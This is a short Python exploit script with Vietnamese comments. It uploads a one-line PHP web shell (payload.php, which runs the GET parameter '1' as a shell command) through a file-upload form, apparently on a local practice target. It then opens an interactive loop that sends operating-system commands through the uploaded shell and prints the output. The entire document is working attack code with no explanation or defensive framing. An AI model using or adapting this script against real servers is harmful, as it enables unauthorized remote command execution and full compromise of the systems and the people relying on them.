import requests
from bs4 import BeautifulSoup
import io

class Exploit:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
    
    # Upload Hình ảnh lên
    def uploadFile(self, files):
        fileUploadResponse = requests.post(self.baseUrl, files=files)

        if fileUploadResponse.status_code != 200:
            print('[-] Fail to upload the file...')
            return
        soup = BeautifulSoup(fileUploadResponse.text, 'html.parser')
        uploadFilePath = soup.a['href']
        print(f'[+] File Upload Path: /{uploadFilePath}')
        return uploadFilePath
    
    # Đọc file sau khi thực thi lệnh
    def readUploadFile(self, uploadFilePath, command):
        fullUploadFilePath = self.baseUrl + uploadFilePath + f'?1={command}'
        uploadFileResponse = requests.get(fullUploadFilePath)

        if uploadFileResponse.status_code != 200:
            print(f'[-] Command Excuted Failed. Try Again')
            return
        print(f'[+] Command Excuted Response: \n{uploadFileResponse.text.strip()}')

if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1/"
    exploit = Exploit(BASE_URL)
    filenamePhp = "payload.php"
    payloadPhp = "<?=`$_GET[1]`?>"
    ObjectPhp = io.BytesIO(payloadPhp.encode())
    files = {
        'file-upload': ('payload.php', ObjectPhp)
    }
    uploadFilePath = exploit.uploadFile(files)
    try:
         print('[*] Execute OS command in here... Type "exit" to quit:')
         while True:
            command = input('> ')
            if command == 'exit':
                print(f'[+] Bye You. See You Again')
                break
            exploit.readUploadFile(uploadFilePath, command)
    except KeyboardInterrupt:
        print('\n[*] Bye!')